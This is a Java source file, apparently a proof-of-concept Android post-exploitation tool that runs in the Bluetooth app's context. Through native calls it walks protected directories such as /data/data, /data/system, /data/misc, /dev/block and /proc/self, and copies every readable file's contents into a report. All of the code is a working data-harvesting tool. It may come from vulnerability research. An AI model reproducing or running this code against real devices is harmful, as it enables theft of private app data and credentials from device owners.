package com.poc;

import java.io.*;
import java.nio.file.*;
import java.text.SimpleDateFormat;
import java.util.*;

public class Main {
    private static final String TAG = "Inspector";
    private static final String OUTPUT_BASE = "/data/data/com.android.bluetooth/inspect_report/";
    private static final int MAX_READ_SIZE = 1024;

    private static BufferedWriter writer;
    private static long fileCount = 0, dirCount = 0, errorCount = 0;

    
    public static native String[] nativeListDirectory(String path);
    public static native String nativeReadFile(String path);

    static {
        System.loadLibrary("native-inspector");
    }

    private static void log(String msg) {
        System.err.println("[" + TAG + "] " + msg);
    }

    public static void main(String[] args) {
        log("=== Inspector started ===");
        try {
            File outDir = new File(OUTPUT_BASE);
            if (!outDir.exists()) outDir.mkdirs();
            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
            String reportFile = OUTPUT_BASE + "report_" + timestamp + ".txt";
            writer = new BufferedWriter(new FileWriter(reportFile));
            writeHeader(reportFile);

            
            String[] targets = {
                "/dev/block",
                "/dev",
                "/data/misc",
                "/data/data",
                "/data/system",
                "/data/local",
                "/data/media",
                "/data/user",
                "/data/app",
                "/proc/self/fd",
                "/proc/self/map_files",
                "/proc/self/root/data/misc",
                "/proc/self/root/data/data"
            };

            for (String target : targets) {
                File f = new File(target);
                if (f.exists()) {
                    log("Scanning: " + target);
                    writer.write("\n=== Scanning: " + target + " ===\n");
                    if (target.startsWith("/proc/self/fd") || target.startsWith("/proc/self/map_files")) {
                    
                        scanSymlinkDir(f);
                    } else {
                        walkWithNative(f, 0);
                    }
                } else {
                    log("Target does not exist: " + target);
                    writer.write("Target does not exist: " + target + "\n");
                }
            }

            writeFooter();
            log("Finished. Files: " + fileCount + ", Dirs: " + dirCount + ", Errors: " + errorCount);
        } catch (Exception e) {
            log("Fatal: " + e);
            try { if (writer != null) writer.write("FATAL: " + e.toString()); } catch (Exception ignored) {}
        } finally {
            try { if (writer != null) writer.close(); } catch (Exception ignored) {}
        }
    }

    private static void walkWithNative(File file, int depth) {
        if (depth > 20) return;
        try {
            if (file.isDirectory()) {
                dirCount++;
                writer.write("D " + file.getAbsolutePath() + "\n");
                writer.flush();

                File[] children = file.listFiles();
                if (children == null) {
                    String[] nativeEntries = nativeListDirectory(file.getAbsolutePath());
                    if (nativeEntries == null) {
                        writer.write("  [Cannot list directory (native failed)]\n");
                        return;
                    }
                    for (String entry : nativeEntries) {
                        String[] parts = entry.split("\\|");
                        if (parts.length < 2) continue;
                        String name = parts[0];
                        char type = parts[1].charAt(0);
                        File sub = new File(file, name);
                        if (type == 'L') {
                            writer.write("  L " + sub.getAbsolutePath() + " [skip]\n");
                            continue;
                        }
                        walkWithNative(sub, depth + 1);
                    }
                } else {
                    Arrays.sort(children);
                    for (File sub : children) {
                        if (Files.isSymbolicLink(sub.toPath())) {
                            try {
                                String linkTarget = Files.readSymbolicLink(sub.toPath()).toString();
                                writer.write("  L " + sub.getAbsolutePath() + " -> " + linkTarget + "\n");
                            } catch (IOException e) {
                                writer.write("  L " + sub.getAbsolutePath() + " [broken]\n");
                            }
                            continue;
                        }
                        walkWithNative(sub, depth + 1);
                    }
                }
            } else if (file.isFile()) {
                fileCount++;
                writer.write("F " + file.getAbsolutePath() + " (size=" + file.length() + ")\n");
                if (file.length() > 0 && file.canRead()) {
                    String content = nativeReadFile(file.getAbsolutePath());
                    if (content != null && !content.isEmpty()) {
                        writer.write("  [CONTENT_START]\n");
                        writer.write(content + "\n");
                        writer.write("  [CONTENT_END]\n");
                    } else {
                        writer.write("  [EMPTY or JNI read failed]\n");
                    }
                } else {
                    writer.write("  [EMPTY or UNREADABLE]\n");
                }
                writer.flush();
            } else {
                writer.write("S " + file.getAbsolutePath() + "\n");
            }
        } catch (Exception e) {
            errorCount++;
            log("Error: " + e);
            try { writer.write("  [ERROR: " + e.getMessage() + "]\n"); } catch (Exception ignored) {}
        }
    }

    private static void scanSymlinkDir(File dir) {
        if (!dir.isDirectory()) return;
        File[] files = dir.listFiles();
        if (files == null) return;
        for (File f : files) {
            try {
                if (Files.isSymbolicLink(f.toPath())) {
                    String target = Files.readSymbolicLink(f.toPath()).toString();
                    writer.write("  L " + f.getName() + " -> " + target + "\n");
                } else {
                    writer.write("  " + f.getName() + "\n");
                }
            } catch (Exception e) {
                try {
                    writer.write("  " + f.getName() + " [error: " + e.getMessage() + "]\n");
                } catch (IOException ignored) {}
            }
        }
        try {
            writer.flush();
        } catch (IOException e) {
            log("Flush error: " + e);
        }
    }

    private static void writeHeader(String reportFile) throws IOException {
        writer.write("Comprehensive Inspector Report\n");
        writer.write("Generated: " + new Date() + "\n");
        writer.write("UID: " + android.os.Process.myUid() + "\n");
        writer.write("------------------------------------------------------------\n\n");
    }

    private static void writeFooter() throws IOException {
        writer.write("\n------------------------------------------------------------\n");
        writer.write("Summary: Dirs=" + dirCount + ", Files=" + fileCount + ", Errors=" + errorCount + "\n");
    }
}
